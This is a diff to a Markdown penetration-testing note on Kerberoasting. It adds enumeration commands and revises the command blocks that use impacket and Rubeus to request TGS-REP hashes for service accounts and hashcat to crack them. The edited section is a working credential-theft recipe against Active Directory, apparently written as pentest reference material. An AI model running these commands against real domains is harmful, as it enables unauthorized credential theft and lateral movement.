@@ -30,23 +30,36 @@ Kerberos service tickets contain a key used by the protocol to encrypt the sessi
 
 ## Exploit
 
-First, identify a domain user with a SPN. To do so, you can use either impacket or Rubeus. Following commands will find all domain users with a SPN associated and request for a TGS-REP. Hashes are then stored into the specified output file.
+First, identify a domain user with a SPN. You can list Kerberoastable users in multiple ways like below.
 
 ```bash
 # From Kali.
-sudo impacket-GetUserSPNs -request -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD
+sudo impacket-GetUserSPNs -dc-ip $dc_ip $domain/$username:$password
+
+# From a domain joined computer with PowerView.
+Get-NetUser -SPN
+
+# From a domain joined computer with Active Directory module.
+Get-ADUSer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+
+Following commands will request a TGS-REP for all Kerberoastable accounts. Hashes are then stored into the specified output file.
+
+```bash
+# From Kali.
+sudo impacket-GetUserSPNs -request -dc-ip $dc_ip $domain/$username:$password
 
 # From a domain joined computer.
 .\Rubeus.exe kerberoast /outfile:kerberoast.out
 
 # From a Windows computer not joined to the domain.
-.\Rubeus.exe kerberoast /creduser:$DOMAIN\$USERNAME /credpassword:$PASSWORD /domain:$DOMAIN /dc:$DC_IP /outfile:kerberost.out
+.\Rubeus.exe kerberoast /creduser:$domain\$username /credpassword:$password /domain:$domain /dc:$dc_ip /outfile:kerberost.out
 ```
 
 Then, use `hashcat` to crack retrieved TGS-REP hashes.
 
 ```bash
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+sudo hashcat -m 13100 kerberoast.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
 ## Recommendations
